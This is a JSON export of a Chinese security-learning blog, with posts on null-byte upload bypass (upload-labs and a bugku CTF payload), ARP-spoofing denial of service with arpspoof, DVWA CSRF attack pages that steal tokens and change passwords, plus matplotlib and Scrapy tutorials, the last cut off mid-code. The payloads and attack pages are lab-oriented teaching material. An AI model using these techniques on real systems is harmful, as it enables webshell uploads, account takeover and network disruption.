{"pages":[],"posts":[{"title":"00截断","text":"00截断——文件上传原理分析： 0x00是十六进制数，表示ASCII码为0的字符，也是字符串的结束标识符。攻击者可以利用手动添加结束标识符（0x00或%00）来截断上传的内容，从而绕过客户端或服务器的检测，上传非法文件。 条件： 121.php版本小于5.3.4；2.php.ini文件中的magic_quotes_gpc设置为off。 注： 1一般将00截断分为0x00截断和%00截断两种，实际上两种截断的本质是一样的，%00经过url解码后就变成0x00。所以说%00适合于get方法，可直接在添加在url中，经过url解码后就变成0x00；0x00适合于post方法，可通过直接修改文件的二进制文件，添加00即可，因为二进制00与十六进制0x00都表示0。 一、%00截断(upload-labs-master/Pass-12) %00截断一般是在url中直接使用%00截断，%00在被浏览器进行urldecode操作后变成0x00，最终传入PHP函数执行截断操作。 源码分析： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); //创建白名单 $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); //截取后缀 if(in_array($file_ext,$ext_arr)){ //检查后缀 $temp_file = $_FILES['upload_file']['tmp_name']; //获得临时文件名 $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; //使用随机数改写文件名和文件路径进行防御 if(move_uploaded_file($temp_file,$img_path)){ //将文件存入设定的路径 $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; }} 首先PHP代码接收到上传的表单信息，然后截取文件后缀，并进行白名单检查，最后将上传的文件存入服务器。这里导致00截断的原因是$img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;这行代码没有对save_path进行检测，直接拼接到路径中，导致可以直接修改变量save_path的值，进而利用00截断绕过使用随机数改写文件名和文件路径的防御。 漏洞复现： 正常上传，查看上传后的路径，发现是直接拼接save_path； 修改save_path，利用%00截断绕过，上传webshell木马文件； 二、0x00截断(upload-labs-master/Pass-13) 0x00截断一般是修改post的二进制文件，将对应字符的十六进制（或二进制）编码改为00，从而起到截断的作用。 源码分析： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传失败\"; } } else { $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; }} 这里除了使用post方式上传变量save_path外，其他的基本与一中的相同。漏洞产生的原因还是直接拼接文件路径。 漏洞复现： 正常上传，查看上传后的路径，发现是直接拼接save_path； 这里要注意变量save_path是post方式，所以要修改post文件的十六进制文件的内容。这里不能直接在post文件的../upload/后面直接加webshell.php00，因为此时的0是一个字符，有对应的十六进制编码0x30，可见输入00最后传入服务器的内容为0x30，而不是0x00，所以不能起到截断作用，必须要在十六进制文件中修改；首先在../upload/后面添加webshell.php(注意最后面有一个空格)，空格的十六进制编码为0x20； 打开十六进制文件，修改空格位置对应的十六进制编码为00； 修改好后直接Forward，上传文件。 思考： 在$img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;和$img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;这两行代码中，都在save_path后面加一个&quot;/&quot;，这里我还不是很清楚反斜杠的作用。但当直接在../upload/后面直接添加webshell.php而没有进行截断时，就会发生上传错误，此时路径会变成../upload/webshell.php/···，上传过程中找不到路径从而导致错误发生。我觉得这也可以作为一种防御方法，在修改的内容的后面（%00之前）加上一个反斜杠，导致文件路径丢失，发生错误，无法上传非法文件，而且浏览器对url中的多个反斜杠会忽略。 三、深入理解00截断0x00和%00最后都会被解析为chr(0)，chr()是一个函数，参数是ASCII码，返回值为参数的ASCII码对应的字符。chr(0)的返回值为NULL，即空字符。截断的关键就在于空字符NULL，如果一个字符串中存在空字符，在被php解析的时候会导致空字符后面的字符串被丢弃。这种情况会出现在php(版本&lt;5.3.4)中，这也就解释了为什么00截断的条件要求php版本小于5.3.4。 ASCII字符 描述 URL编码 十六进制代码 NUL null字符，空字符 %00 00 四、再探%00注意：在使用%00进行截断时，不能直接将%00加在文件名中。因为PHP函数会对文件的后缀进行提取，然后再进行检测。如果文件名是webshell.php%00webshell.jpg，那么截取后缀的函数就会在%00处停止，所以后缀就为.php，而不是.jpg，从而导致文件不能上传。%00使用的场景还要视具体的情况而定。上面举的例子是由于后端php源码中没有检查$_GET['save_path']，所以可以修改save_path的内容，使用%00绕过。 %00是否需要进行urldecode操作？ 其实使用%00必须要进行url解码。 在使用post方法上传文件（要与post传参区分开）时，需要创建一个表单来支持文件上传，也就是使用表单来实现文件上传。表单内容： 12345678&lt;!-- The data encoding type, enctype, MUST be specified as below --&gt;&lt;form enctype=\"multipart/form-data\" action=\"__URL__\" method=\"POST\"&gt; &lt;!-- MAX_FILE_SIZE must precede the file input field --&gt; &lt;input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"30000\" /&gt; &lt;!-- Name of input element determines name in $_FILES array --&gt; Send this file: &lt;input name=\"userfile\" type=\"file\" /&gt; &lt;input type=\"submit\" value=\"Send File\" /&gt;&lt;/form&gt; #表单中的_URL_ 应该被换掉，指向一个真实的 PHP 文件。 enctype=&quot;multipart/form-data&quot;：enctype，即encodetype，是编码类型的意思；multipart/form-data是指表单数据由多部分构成，既有文本数据，又有文件等二进制数据。默认情况下，enctype的值是application/x-www-form-urlencoded，不能用于文件上传，只有当值设定为multipart/form-data，才能完整的传递文件数据。application/x-www-form-urlencoded不是不能上传文件，而是只能上传文本格式的文件，上传其他类型的文件时可能会导致文件损坏，数据丢失等等；multipart/form-data是将文件以二进制的形式上传，从而可以实现多种类型的文件上传。表单如果支持上传文件，则还必须附加二进制数据并将其与表单数据分开。 当设置enctype=&quot;multipart/form-data&quot;时，表示请求主体内容不做url编码，直接原文传输。在一中，参数附在url中，所以要使用%00（即ASCII字符中的NULL字符的url编码）来进行阶段，因为浏览器此时不会进行url编码，数据传到服务器后，服务器会对url进行解码，然后再将解码后的内容传入php文件。所以php接收到的是0x00（NULL），而不是%00。要注意的是，浏览器只会在必要的时候进行URL编码，不会进行URL解码，所有的url都是在服务器上进行urldecode操作的。而在二中，情况就会有所不同。 二中post传递的参数save_path是放在HTTP请求主体内容中，不像一中是放在url中，所以服务器不会对其进行url解码，也就是说不能直接使用%00来截断，只能在对应的十六进制文件中修改。如果直接在根目录../upload/后面加NUL，不能起到截断作用，因为NUL会被当成三个字符，而不是单个字符，所以必须要修改十六进制代码才行。如果要在二中使用%00，就需要先进行url解码才可以起到截断作用。 在二中使用%00截断： burpsuite的Decoder模块提供了解码功能。首先使用bp抓包，修改变量save_path的值，然后右键，Send to Decoder; 然后进入Decode模块，选择解码方式为URL，进行解码； 将解码后的内容复制到Proxy模块中，然后Forward； 上传成功。 00截断——代码审计原理分析： 一些PHP函数在读取到0x00（指ASCII码为0 的字符，空字符）时，会自动停止，空字符后面的内容会被忽略。所以可以使用00截断来绕过函数的检测，进行非法操作。 实例（bugku-ereg正则%00截断）： https://ctf.bugku.com/challenges#ereg正则截断 123456789101112131415161718192021222324252627282930313233343536//题目源码&lt;?php$flag = \"xxx\";if (isset ($_GET['password'])){if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE){echo 'You password must be alphanumeric';}else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999){if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置{die('Flag: ' . $flag);}else{echo('*-* have not been found');}}else{echo 'Invalid password';}}?&gt; 分析： ereg正则限制了password的值只能为一个或多个大小写字母，数字； password的长度要小于8，而且要大于9999999； strpos查找并返回一个字符串在另一个字符串中出现的位置（区分大小写），password中必须要出现*-*才能getflag； 绕过： 利用00截断绕过ereg正则，并添加'-'； 利用科学计数法绕过长度限制； payload: 1http://123.206.87.240:9009/5.php?password=1e8%00*-* 注：%00的长度为1 %00经过url解码后，其十六进制代码为00，变成二进制就是00000000，占八位（一字节），所以长度为1。","link":"/00%E6%88%AA%E6%96%AD/"},{"title":"Kali Linux 基本工具使用","text":"一、局域网断网攻击（arp攻击） 虚拟机 + 物理机，针对单个ip。 准备： 虚拟机ip与本机ip处于同一网段 ； root@kali1:~# apt install dsniff ssldump 12**工具：**`arpspoof` arpspoof -i 网卡 -t 目标主机ip 网关 demo： 虚拟机攻击物理机。 查看主机ip，网卡，网关； arp攻击； 本机无法上网，断网成功；Ctrl + C可停止断网攻击。 二、端口扫描（Nmap）","link":"/Kali-Linux-%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"title":"Python数据可视化基础","text":"数据可视化 数据可视化指的是通过可视化表示来探索数据。 生成数据安装matplotlib Linux 系统 1$ sudo apt-get install python3-matplotlib 适用python3 windows系统 先访问 https://pypi.org/project/matplotlib/#files 找到与使用的python版本匹配的.whl文件；下载到指定文件夹；然后安装： 1234pip install [.whl文件的路径]例：pip install D:\\下载\\python\\Lib\\site-packages\\matplotlib-3.2.0-cp37-cp37m-win_amd64.whl 绘制简单的折线图绘制折线图plot( ) 1234567891011121314import matplotlib.pyplot as pltinput_value = [1, 2, 3, 4, 5]squares = [1, 4, 9, 16, 25]plt.plot(input_value, squares, linewidth = 5)#给图表和坐标轴设置标题plt.title(\"Square Numbers\", fontsize = 24)plt.xlabel(\"Value\",fontsize = 14)plt.ylabel(\"Square of Value\", fontsize = 14)#设置刻度标记的大小plt.tick_params(axis='both', labelsize = 14)plt.show() 导入pyplot模块； plot( )函数指定x（input_value），y（squares）的值，同时参数linewidth规定plot绘制线条的粗细。title( )函数给图表指定标题。函数xlabel( )和ylabel( )分别设定坐标轴x，y的标题。fontsize指定图表中文字的大小。函数tick_params( )设置刻度样式，其中指定的参数axis=’both’表示应用于x，y轴的刻度，labelsize设置刻度标记的字号。函数show( )打开matplotlib查看器。 绘制散点图scatter( ) 123456789101112131415import matplotlib.pyplot as pltx_values = [1, 2, 3, 4, 5]y_values = [1, 4, 9, 16, 25]plt.scatter(x_values, y_values, s = 200)#给图表和坐标轴设置标题plt.title('Square Numbers', fontsize = 24)plt.xlabel('Value', fontsize = 14)plt.ylabel('Square of Value', fontsize = 14)#设置刻度标记的大小plt.tick_params(axis='both', labelsize=14)plt.show() 函数scatter( )绘制单个点，实参s设置绘制图形时使用点的尺寸。 绘制一系列点 在绘制的点比较多时，手动计算，输入的效率比较低。可以通过python循环来完成计算并将数据添加到列表中。 12345678910111213141516import matplotlib.pyplot as plt#自动计算数据x_values = list(range(1, 1001)) #生成列表y_values = [x**2 for x in x_values] #计算值plt.scatter(x_values, y_values, s = 5)plt.title('Square Numbers', fontsize = 24)plt.xlabel('Value', fontsize = 14)plt.ylabel('Square of Value', fontsize = 14)plt.tick_params(axis='both', labelsize=14)plt.axis([0,1100, 0,1100000]) #设置每个坐标轴的取值范围plt.show() matplotlib允许给散点图中的各个点指定颜色，默认为蓝色点和黑色轮廓。plt.scatter(x_values, y_values, edgecolor = 'none' ,s = 5)中的edgecolor参数设置数据点的轮廓，默认为none。 自定义颜色 123import matplotlib.pyplot as pltplt.scatter(2,2,c='black',edgecolors='red',s=200)plt.show() 参数 c 设置点的颜色，参数 edgecolor 设置点的轮廓的颜色。单独使用edgecolor，点的颜色为默认颜色（蓝色）。产生轮廓的原理是拿一个尺寸较小的点去覆盖另一个尺寸较大的点。 参数 c 的值还可以是一个元组，如c = (0,0,0.8)；元组中的每个元素都是介于0~1之间的值，分别表示红色、绿色和蓝色的分量。 颜色映射 颜色映射（colormap）是一系列颜色，它们从起始颜色渐变到结束颜色。模块pyplot内置了一组颜色映射。 123456789101112131415import matplotlib.pyplot as pltx_values = list(range(1, 1001)) #生成列表y_values = [x**2 for x in x_values] #计算值plt.scatter(x_values, y_values, c=y_values, cmap=plt.cm.Blues, edgecolors='none', s = 5)plt.title('Square Numbers', fontsize = 24)plt.xlabel('Value', fontsize = 14)plt.ylabel('Square of Value', fontsize = 14)plt.tick_params(axis='both', labelsize=14)plt.axis([0,1100, 0,1100000]) #设置每个坐标轴的取值范围plt.show() 将参数 c 设置成一个y值列表，参数 cmap 规定使用哪种颜色。 常见的颜色： 自动保存图片 要让程序自动保存图表，可将plt.show( )替换成plt.savefig( )： 1plt.savefig('D:\\1.png', bbox_inches = 'tight') 第一个参数指定保存图表的路径和文件名；第二个参数将图表多余的空白区域裁减掉，如果要保留，则忽略这个参数。 随机漫步12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import matplotlib.pyplot as pltfrom random import choice#创建一个随机漫步的类class RandomWork(): def __init__(self,num_points): #初始化随机漫步的属性 self.num_points = num_points #创建存储数据的数组，并让每次漫步都是从（0,0）点开始 self.x_values = [0] self.y_values = [0] #生成随机漫步的点数据 def fill_walk(self): while len(self.x_values) &lt; self.num_points: #随机产生前进的方向和距离 x_step = self.step() y_step = self.step() #避免重复 if x_step == 0 and y_step==0 : continue #计算下一个点的x，y值 next_x = x_step + self.x_values[-1] next_y = y_step + self.y_values[-1] #将得到的x，y的值存放到数组中 self.x_values.append(next_x) self.y_values.append(next_y) #随机产生点数据 def step(self): direction = choice([-1, 1]) distance = choice([0, 1, 2, 3, 4]) step = direction * distance return step #生成数据rw = RandomWork(10000)rw.fill_walk()#绘制散点图,使用颜色映射point_nums = list(range(rw.num_points))plt.scatter(rw.x_values, rw.y_values, s=5, c=point_nums, cmap=plt.cm.Blues, edgecolors='none')#突出起点和终点plt.scatter(0, 0, c='red', edgecolors='none', s=20)plt.scatter(rw.x_values[-1], rw.y_values[-1], c='red', edgecolors='none', s=20)#隐藏坐标轴plt.axis('off')plt.show() 创建RandomWalk类来生成数据，然后使用scatter( )函数画图。 使用Pygal模拟掷骰子","link":"/Python%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%9F%BA%E7%A1%80/"},{"title":"CSRF（跨站请求劫持）","text":"CSRF（跨站请求伪造） CSRF的原理是利用受害者尚未过期的身份验证信息（cookie、会话等），诱骗其点击恶意连接或访问包含恶意代码的页面，在受害人不知情的情况下以受害者的身份向服务器发送请求，从而完成非法操作（如改密、转账等）。 用户访问服务器的登录页面，输入正确的用户名和密码后，服务器通过set-cookie向客户端（浏览器）返回cookie，浏览器会保存这个cookie，并在以后的请求中都会带上cookie。举个例子，当你登录学校网站，下载完作业后关闭了页面，然后你发现与作业相关的文件未下载，然后你又去访问学校网站，这次访问你并不需要再输入用户名和密码，这时候就是cookie起了作用，它会保存你的登录状态，不过这是有时间限制的，因为在规定的时间之后cookie会失效，当你隔一天再次访问学校网站的时候就需要输密码了。 实例：(DVWA)Low源码： 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);}?&gt; php代码检查通过get方法提交的参数password_new和password_conf的值是否相同，如果相同就会修改密码。没有任何的CSRF防御机制，只有服务器通过cookie验证身份（这里的代码没有体现）。$GLOBALS[&quot;___mysqli_ston&quot;]表示一个数据库连接：$ link =( $ GLOBALS [“ ___ mysqli_ston”] = mysqli_connect( $ hostname，$ username，$ pwd ) ) payload： 1http://localhost:8080/dvwa/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=change 当受害者点击上面的链接后，密码就会被修改成hacker。 但这种攻击方法太过明显，稍微有点常识的人都会避免点击这种链接或者发现自己已经遭受攻击，密码被篡改。所以现实中一般都是将链接隐藏在另一个页面中，当用户点击攻击者设计好的链接跳转到该页面后，加载该页面的时候也会加载隐藏好的链接，从而触发攻击。这种情况下受害者一般很难发现自己遭受了攻击并且密码被篡改。还有另外一种方法就是隐藏url，百度有工具可以将域名生成对应的短链接。 payload：(本地演示) 1http://localhost:8080/test.html 攻击者通过各种手段诱骗受害者点击上面的链接，然后跳转到test.html页面，下面是test.html页面的源代码： 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"http://localhost:8080/dvwa/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=change\" border=\"0\" style=\"display:none;\"/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt;&lt;/body&gt;&lt;/html&gt; 用户会以为自己点击的是一个无效的url链接，其实自己的密码已经被篡改。 需要注意的是，CSRF的关键是利用受害者的cookie，如果受害者用Chrome登录网站，然后使用其他浏览器（比如说火狐）点击链接，攻击是不会触发的，因为火狐不会使用Chrome的cookie，所以身份验证不会通过，也就无法篡改密码。 Medium源码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } } else { // Didn't come from a trusted source echo \"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);}?&gt; stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])函数检查变量$_SERVER[ 'HTTP_REFERER' ]中是否含有变量$_SERVER[ 'SERVER_NAME' ]，正则匹配；HTTP_REFERER（http请求的referer字段，表示请求的来源地址，方便用户在页面加载失败后返回前一个页面），SERVER_NAME（要访问的主机名，服务器的ip）； 这里php代码会检查http请求的Referer字段中是否含有要访问的主机名，也就是服务器的ip地址。只需要url中包含主机名即可绕过。 payload：(本地演示) 1http://localhost:8080/localhost:8080test.html 本地的主机名是localhost:8080，可以抓包查看，额，有点小尴尬，直接无视掉前面的一个localhost:8080就行了；这里无法给出demo，因为文件名不能包含:，总之只要知道构造的恶意页面的文件名要包含网站的主机名。 盗一张大佬的图： High123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt; php代码加入了Anti-CSRF token机制，检查token；用户每次访问改密页面时，服务器会返回一个随机的token，当用户向服务器发起请求（改密）时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 这里绕过的关键就是获取token，可以利用受害者的cookie去修改密码的页面获取token；构造攻击页面： 引用大佬的代码： 1234567891011121314151617181920212223242526272829303132333435363738&lt;script type=\"text/javascript\"&gt; function attack() { document.getElementsByName('user_token')[0].value=document.getElementById(\"hack\").contentWindow.document.getElementsByName('user_token')[0].value; document.getElementById(\"transfer\").submit(); }&lt;/script&gt; &lt;iframe src=\"http://192.168.153.130/dvwa/vulnerabilities/csrf\" id=\"hack\" border=\"0\" style=\"display:none;\"&gt;&lt;/iframe&gt; &lt;body onload=\"attack()\"&gt; &lt;form method=\"GET\" id=\"transfer\" action=\"http://192.168.153.130/dvwa/vulnerabilities/csrf\"&gt; &lt;input type=\"hidden\" name=\"password_new\" value=\"password\"&gt; &lt;input type=\"hidden\" name=\"password_conf\" value=\"password\"&gt; &lt;input type=\"hidden\" name=\"user_token\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\"&gt; &lt;/form&gt;&lt;/body&gt; 上面这段代码首先是获得用户登录改密页面时服务器返回的token的值，然后再将得到的值加入代要提交的表单中，当然这里表单内容是通过hidden方式隐藏起来的。服务器收到请求后，检查token正确，然后进行改密操作。iframe框架将用户的页面放入攻击页面，从而可以通过js代码获取token。 不过，上面的攻击方式往往是不能成功的，因为这里牵扯到跨域问题。现在的浏览器是不允许进行跨域请求的。下面简单解释一下跨域：上面代码总的iframe框架访问的主机地址是http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而攻击页面位于黑客服务器上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B下的页面，我们的攻击脚本不能获得改密页面中的user_token。 由于跨域问题的存在，所以我们需要先将代码注入到目标服务器上，才有可能完成攻击。 Impossible123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpif( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;\"; }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 上面的代码利用PDO技术防御SQL注入，对于防御CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 参考文章： https://www.freebuf.com/articles/web/118352.html","link":"/CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81%EF%BC%89/"},{"title":"Scrapy框架","text":"安装安装scrapy 1pip install scrapy 安装pypiwin32(Windows系统) 1pip install pypiwin32 123456789101112131415161.引擎(Scrapy Engine)用来处理整个系统的数据流处理, 触发事务(框架核心)2.调度器(Scheduler)用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回；由它来决定下一个要抓取的网址是什么, 同时去除重复的网址3.下载器(Downloader)用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)4.爬虫(Spiders)爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面5.项目管道(Pipeline)负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息6.下载器中间件(Downloader Middlewares)位于Scrapy引擎和下载器之间的框架，主要是处理Scrapy引擎与下载器之间的请求及响应7.爬虫中间件(Spider Middlewares)介于Scrapy引擎和爬虫之间的框架，主要工作是处理蜘蛛的响应输入和请求输出8.调度中间件(Scheduler Middewares)介于Scrapy引擎和调度之间的中间件，从Scrapy引擎发送到调度的请求和响应 环境搭建（以爬取糗事百科为例）创建项目（myspider） 使用scrapy框架创建项目，需要通过命令行来创建。首先进入项目所在目录，然后打开命令行，输入如下命令： 1scrapy startproject [项目名称] 1234561.items.py：用来存放爬虫爬取下来的数据的模型2.middlewares.py：用来存放各种中间件的文件3.pipelines.py：用来将items的模型存储到本地磁盘中4.setting.py：本爬虫的一些配置信息（比如请求头，设置延时，ip代理池等）5.scrapy.cfg：项目的配置文件6.spider包：所有的爬虫，都是存放在这个文件夹里面 创建爬虫（qsbk.py） 先进入到项目文件夹中，然后执行如下命令，创建爬虫文件： 1scrapy genspider qsbk \"qiushibaike.com\" 爬虫名称不能和项目名称相同； 运行爬虫（qsbk.py） 先进入到项目文件夹中，然后执行如下命令： 1scrapy crawl qsbk 爬虫代码 设置settings.py文件； 123456789# Obey robots.txt rulesROBOTSTXT_OBEY = False# Override the default request headers:DEFAULT_REQUEST_HEADERS = { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'} 如果不想每次都在命令行中运行爬虫，可以在爬虫myspider跟目录下创建一个运行文件run.py，代码如下： 1234from scrapy import cmdline# cmdline.execute(\"scrapy crawl qsbk\".split()) 或cmdline.execute(['scrapy', 'crawl', 'qsbk']) qsbk.py（爬虫文件） 123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-import scrapyfrom myspider.items import MyspiderItemclass QsbkSpider(scrapy.Spider): # 继承Spider类 name = 'qsbk' # 爬虫名称，运行时查找对应的爬虫文件 allowed_domains = ['qiushibaike.com'] # 限制爬虫的爬取范围 start_urls = 